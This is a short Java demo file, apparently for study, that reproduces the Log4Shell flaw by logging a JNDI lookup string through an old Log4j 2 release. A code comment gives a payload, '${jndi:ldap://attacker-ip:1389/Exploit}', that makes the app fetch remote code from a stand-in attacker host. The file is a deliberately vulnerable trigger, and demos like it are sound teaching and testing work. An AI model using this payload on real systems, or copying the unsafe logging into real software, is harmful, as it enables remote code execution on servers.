package com.study;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VulnerableApp {
    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

    public static void main(String[] args) {
        // The payload mimics malicious input that would be logged by the system.
        // Override via: java -Dexploit.payload='${jndi:ldap://attacker-ip:1389/Exploit}' -jar app.jar
        String payload = System.getProperty("exploit.payload", "${jndi:ldap://127.0.0.1:1389/a}");

        System.out.println("Triggering log event with payload: " + payload);

        // This line triggers the JNDI lookup in Log4j 2.0-rc1
        logger.error("Data: {}", payload);
    }
}
